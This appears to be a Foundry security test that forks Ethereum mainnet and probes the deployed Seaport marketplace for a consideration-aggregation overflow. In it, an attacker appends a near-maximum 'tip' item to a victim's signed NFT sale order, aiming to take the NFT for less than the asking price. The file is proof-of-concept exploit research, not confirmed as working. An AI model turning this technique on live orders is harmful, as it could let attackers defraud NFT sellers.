// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    AdvancedOrder,
    CriteriaResolver,
    Execution,
    FulfillmentComponent,
    OfferItem,
    ConsiderationItem,
    OrderComponents,
    OrderParameters
} from "seaport-types/src/lib/ConsiderationStructs.sol";
import { ItemType, OrderType } from "seaport-types/src/lib/ConsiderationEnums.sol";

interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function addr(uint256 privateKey) external returns (address);
    function prank(address msgSender) external;
    function sign(uint256 privateKey, bytes32 digest) external returns (uint8 v, bytes32 r, bytes32 s);
}

interface ISeaport {
    function information() external view returns (string memory version, bytes32 domainSeparator, address conduitController);
    function getCounter(address offerer) external view returns (uint256 counter);
    function getOrderHash(OrderComponents calldata order) external view returns (bytes32 orderHash);
    function fulfillAdvancedOrder(
        AdvancedOrder calldata advancedOrder,
        CriteriaResolver[] calldata criteriaResolvers,
        bytes32 fulfillerConduitKey,
        address recipient
    ) external payable returns (bool fulfilled);
    function fulfillAvailableAdvancedOrders(
        AdvancedOrder[] calldata advancedOrders,
        CriteriaResolver[] calldata criteriaResolvers,
        FulfillmentComponent[][] calldata offerFulfillments,
        FulfillmentComponent[][] calldata considerationFulfillments,
        bytes32 fulfillerConduitKey,
        address recipient,
        uint256 maximumFulfilled
    ) external payable returns (bool[] memory availableOrders, Execution[] memory executions);
}

contract TestERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE");
        require(balanceOf[from] >= amount, "BALANCE");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract TestERC721 {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;
    event Transfer(address indexed from, address indexed to, uint256 indexed id);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "MINTED");
        ownerOf[id] = to;
        emit Transfer(address(0), to, id);
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(msg.sender == from || isApprovedForAll[from][msg.sender], "NOT_AUTHORIZED");
        require(ownerOf[id] == from, "NOT_OWNER");
        ownerOf[id] = to;
        emit Transfer(from, to, id);
    }
}

contract AggregationOverflowTest {
    event log_string(string value);
    event log_named_uint(string key, uint256 value);
    event log_named_address(string key, address value);

    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    ISeaport internal constant SEAPORT = ISeaport(0x0000000000000068F116a894984e2DB1123eB395);
    uint256 internal constant FORK_BLOCK = 25_940_124;
    uint256 internal constant VICTIM_PK = 0xA11CE;
    uint256 internal constant ATTACKER_PK = 0xB0B;

    function _fork() internal {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com", FORK_BLOCK);
        uint256 size;
        address target = address(SEAPORT);
        assembly { size := extcodesize(target) }
        require(size > 20_000, "DEPLOYED_RUNTIME_MISSING");
    }

    function _digest(OrderComponents memory components) internal view returns (bytes32) {
        bytes32 orderHash = SEAPORT.getOrderHash(components);
        (, bytes32 domainSeparator,) = SEAPORT.information();
        return keccak256(abi.encodePacked(hex"1901", domainSeparator, orderHash));
    }

    function _sign(
        uint256 privateKey,
        address offerer,
        TestERC721 nft,
        TestERC20 erc20,
        uint256 tokenId,
        uint256 price,
        uint256 salt
    ) internal view returns (bytes memory signature) {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem({
            itemType: ItemType.ERC721,
            token: address(nft),
            identifierOrCriteria: tokenId,
            startAmount: 1,
            endAmount: 1
        });
        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem({
            itemType: ItemType.ERC20,
            token: address(erc20),
            identifierOrCriteria: 0,
            startAmount: price,
            endAmount: price,
            recipient: payable(offerer)
        });
        OrderComponents memory components = OrderComponents({
            offerer: offerer,
            zone: address(0),
            offer: offer,
            consideration: consideration,
            orderType: OrderType.FULL_OPEN,
            startTime: 0,
            endTime: type(uint256).max,
            zoneHash: bytes32(0),
            salt: salt,
            conduitKey: bytes32(0),
            counter: SEAPORT.getCounter(offerer)
        });
        bytes32 digest = _digest(components);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        signature = abi.encodePacked(r, s, v);
    }

    function _advanced(
        address offerer,
        TestERC721 nft,
        TestERC20 erc20,
        uint256 tokenId,
        uint256 price,
        uint256 salt,
        bytes memory signature,
        bool addOverflowTip
    ) internal pure returns (AdvancedOrder memory order) {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem({
            itemType: ItemType.ERC721,
            token: address(nft),
            identifierOrCriteria: tokenId,
            startAmount: 1,
            endAmount: 1
        });
        ConsiderationItem[] memory consideration = new ConsiderationItem[](addOverflowTip ? 2 : 1);
        consideration[0] = ConsiderationItem({
            itemType: ItemType.ERC20,
            token: address(erc20),
            identifierOrCriteria: 0,
            startAmount: price,
            endAmount: price,
            recipient: payable(offerer)
        });
        if (addOverflowTip) {
            uint256 tip = type(uint256).max - 49;
            consideration[1] = ConsiderationItem({
                itemType: ItemType.ERC20,
                token: address(erc20),
                identifierOrCriteria: 0,
                startAmount: tip,
                endAmount: tip,
                recipient: payable(offerer)
            });
        }
        OrderParameters memory parameters = OrderParameters({
            offerer: offerer,
            zone: address(0),
            offer: offer,
            consideration: consideration,
            orderType: OrderType.FULL_OPEN,
            startTime: 0,
            endTime: type(uint256).max,
            zoneHash: bytes32(0),
            salt: salt,
            conduitKey: bytes32(0),
            totalOriginalConsiderationItems: 1
        });
        order = AdvancedOrder({
            parameters: parameters,
            numerator: 1,
            denominator: 1,
            signature: signature,
            extraData: ""
        });
    }

    function testCanonicalControl() public {
        _fork();
        address victim = vm.addr(VICTIM_PK);
        address attacker = vm.addr(ATTACKER_PK);
        TestERC20 erc20 = new TestERC20();
        TestERC721 nft = new TestERC721();
        nft.mint(victim, 1);
        erc20.mint(attacker, 100);
        vm.prank(victim);
        nft.setApprovalForAll(address(SEAPORT), true);
        vm.prank(attacker);
        erc20.approve(address(SEAPORT), type(uint256).max);
        bytes memory sig = _sign(VICTIM_PK, victim, nft, erc20, 1, 100, 111);
        AdvancedOrder memory order = _advanced(victim, nft, erc20, 1, 100, 111, sig, false);
        CriteriaResolver[] memory criteria = new CriteriaResolver[](0);
        vm.prank(attacker);
        bool fulfilled = SEAPORT.fulfillAdvancedOrder(order, criteria, bytes32(0), attacker);
        require(fulfilled, "CONTROL_NOT_FULFILLED");
        require(nft.ownerOf(1) == attacker, "CONTROL_NFT");
        require(erc20.balanceOf(victim) == 100, "CONTROL_PAYMENT");
        emit log_string("CANONICAL_CONTROL_OK");
    }

    function testAggregationOverflowProbe() public {
        _fork();
        address victim = vm.addr(VICTIM_PK);
        address attacker = vm.addr(ATTACKER_PK);
        TestERC20 erc20 = new TestERC20();
        TestERC721 nft = new TestERC721();
        nft.mint(victim, 2);
        erc20.mint(attacker, 50);
        vm.prank(victim);
        nft.setApprovalForAll(address(SEAPORT), true);
        vm.prank(attacker);
        erc20.approve(address(SEAPORT), type(uint256).max);
        bytes memory sig = _sign(VICTIM_PK, victim, nft, erc20, 2, 100, 222);
        AdvancedOrder[] memory orders = new AdvancedOrder[](1);
        orders[0] = _advanced(victim, nft, erc20, 2, 100, 222, sig, true);
        CriteriaResolver[] memory criteria = new CriteriaResolver[](0);
        FulfillmentComponent[][] memory offerFulfillments = new FulfillmentComponent[][](1);
        offerFulfillments[0] = new FulfillmentComponent[](1);
        offerFulfillments[0][0] = FulfillmentComponent({orderIndex: 0, itemIndex: 0});
        FulfillmentComponent[][] memory considerationFulfillments = new FulfillmentComponent[][](1);
        considerationFulfillments[0] = new FulfillmentComponent[](2);
        considerationFulfillments[0][0] = FulfillmentComponent({orderIndex: 0, itemIndex: 0});
        considerationFulfillments[0][1] = FulfillmentComponent({orderIndex: 0, itemIndex: 1});

        uint256 victimBefore = erc20.balanceOf(victim);
        address ownerBefore = nft.ownerOf(2);
        require(ownerBefore == victim, "BAD_PRECONDITION");

        bytes memory data = abi.encodeCall(
            ISeaport.fulfillAvailableAdvancedOrders,
            (orders, criteria, offerFulfillments, considerationFulfillments, bytes32(0), attacker, 1)
        );
        vm.prank(attacker);
        (bool ok, bytes memory returndata) = address(SEAPORT).call(data);
        returndata;

        uint256 victimAfter = erc20.balanceOf(victim);
        address ownerAfter = nft.ownerOf(2);
        emit log_named_uint("victim_before", victimBefore);
        emit log_named_uint("victim_after", victimAfter);
        emit log_named_address("owner_after", ownerAfter);

        if (!ok) {
            require(ownerAfter == victim, "ATOMICITY_BROKEN");
            require(victimAfter == victimBefore, "PAYMENT_ON_REVERT");
            emit log_string("OVERFLOW_REJECTED");
            return;
        }

        if (ownerAfter == attacker && victimAfter - victimBefore < 100) {
            emit log_string("P1_OVERFLOW_CONFIRMED");
            revert("P1_OVERFLOW_CONFIRMED");
        }

        require(ownerAfter == victim || victimAfter - victimBefore >= 100, "UNAUTHORIZED_DELTA");
        emit log_string("OVERFLOW_SAFE_SUCCESS");
    }
}
